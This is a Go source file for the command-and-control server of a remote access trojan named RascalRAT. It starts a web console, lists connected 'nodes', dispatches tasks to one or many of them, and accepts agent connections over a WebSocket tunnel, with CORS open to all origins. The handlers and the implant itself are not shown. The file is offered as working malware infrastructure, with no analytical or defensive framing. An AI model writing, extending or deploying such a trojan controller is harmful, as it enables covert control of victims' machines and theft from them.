package main

import (
	"context"
	"errors"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/its-ernest/RascalRAT/internal/ws"
	"github.com/its-ernest/RascalRAT/pkg/server"

	"log/slog"

	"github.com/labstack/echo/v5"
	"github.com/labstack/echo/v5/middleware"
	"github.com/joho/godotenv"
)

type TemplateRenderer struct {
	templates *template.Template
}

func (r *TemplateRenderer) Render(c *echo.Context, w io.Writer, name string, data any) error {
	return r.templates.ExecuteTemplate(w, name, data)
}

func main() {
	godotenv.Load(".env")

	if err := server.ReadAndPrintFile("doom.txt", "cyan"); err != nil {
		fmt.Println("Error:", err)
	}

	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	e := echo.New()
	e.Renderer = &TemplateRenderer{templates: template.Must(template.ParseGlob("templates/*.html"))}
	e.Use(middleware.RequestLogger())
	e.Use(middleware.Recover())

	// Allow browser control scripts running on localhost to send requests
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept},
		AllowMethods: []string{http.MethodGet, http.MethodPost},
	}))

	hub := ws.NewHub()

	initAuthRoutes(e)
	applyAuthMiddleware(e)

	// Operational REST Endpoints
	e.GET("/", func(c *echo.Context) error {
		return c.Render(http.StatusOK, "index.html", map[string]any{"Title": "RascalRAT Console"})
	})
	e.GET("/status", handleStatus)

	// Node Management and Task Execution Endpoints
	e.GET("/nodes", func(c *echo.Context) error {
		return handleListNodes(c, hub)
	})
	e.POST("/nodes/task", func(c *echo.Context) error {
		return handleDispatchTaskMulti(c, hub)
	})
	e.POST("/nodes/:id/task", func(c *echo.Context) error {
		return handleDispatchTask(c, hub)
	})

	// The Single WebSocket tracking tunnel endpoint
	e.GET("/ws/connect", func(c *echo.Context) error {
		return handleAgentWebSocket(c, hub)
	})

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	addr := os.Getenv("PORT")
	if addr == "" {
		addr = ":8182"
	} else if !strings.HasPrefix(addr, ":") {
		addr = ":" + addr
	}

	sc := echo.StartConfig{
		Address:         addr,
		GracefulTimeout: 10 * time.Second,
	}

	slog.Info("starting high-performance administration console", "port", sc.Address)

	if err := sc.Start(ctx, e); err != nil && !errors.Is(err, http.ErrServerClosed) {
		slog.Error("server boot failure", "err", err)
	}

	hub.CloseAll("server shutdown")
	slog.Info("management api gracefully exited.")
}

func handleStatus(c *echo.Context) error {
	return c.JSON(http.StatusOK, map[string]string{"status": "operational"})
}
